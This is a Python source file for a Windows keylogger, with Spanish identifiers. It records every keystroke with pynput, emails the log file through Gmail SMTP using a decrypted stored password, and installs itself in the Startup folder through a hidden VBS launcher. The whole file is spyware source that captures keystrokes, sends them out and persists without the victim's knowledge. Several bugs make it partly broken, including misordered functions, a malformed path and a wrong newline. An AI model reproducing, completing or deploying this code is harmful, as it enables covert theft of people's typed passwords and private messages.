import datetime
import getpass

from pynput.keyboard import Listener

import time
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
import getpass
import os

fecha = datetime.datetime.now().strftime('%d-%m-%Y %H-%M-%S')

tiempoInicial = time.time()

def grabarDatos(key):
    archivoConLosDatos = open('keylogger_{}.txt'.format(fecha), 'w')
    key = str(key)

    if key == 'key.enter':
        archivoConLosDatos.write('/n')
    elif key == 'Key.space':
        archivoConLosDatos.write(' ')
    elif key == 'Key.backspace':
        archivoConLosDatos.write('%BORRAR%')
    elif key == '<65027>':
        archivoConLosDatos.write('%ARROBA%')
    else:
        archivoConLosDatos.write(key.replace( "'", ""))

    if time.time() -tiempoInicial > 60:
        archivoConLosDatos.close()
        enviarMail(archivoConLosDatos)
        quit()

with Listener(on_press = grabarDatos) as l:
    l.join()

def enviarMail(archivoConLosDatos):
    def cargar_clave():
        return  open('clave.encriptacion', 'rb').read()

    key = cargar_clave()
    clave = Fernet(key)
    clave_encriptada = (open('clave.encriptada', 'rb').read())
    password = clave.decrypt((clave_encriptada)).decode()

    msg = MIMEMultipart()
    mensaje = 'Se envia el archivo solicitado'

    msg.attach(MIMEText(mensaje, 'plain'))

    msg['From'] = 'ejemplo@hotmail.com'
    msg['To'] = 'ejemplo@hotmail.com'
    msg['Subject'] = 'Archivo con los Datos'

    adjunto = open(archivoConLosDatos, 'r')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((adjunto).read())

    p.add_header('Content-Disposition', "adjunto; filename= %s" % str(archivoConLosDatos))
    msg.attach(p)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

def mover_fichero():
    USER_NAME = getpass.getuser()
    final_path = 'C:\\Users\\{}AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))

    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        bat_file.write('python "keylogger2.py"')

    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScripHost\n')
        vbs_file.write('Set WinScripHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScripHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Set WinScripHost = Nothing\n')


if __name__ == '__main__':
    mover_fichero()
    grabarDatos()
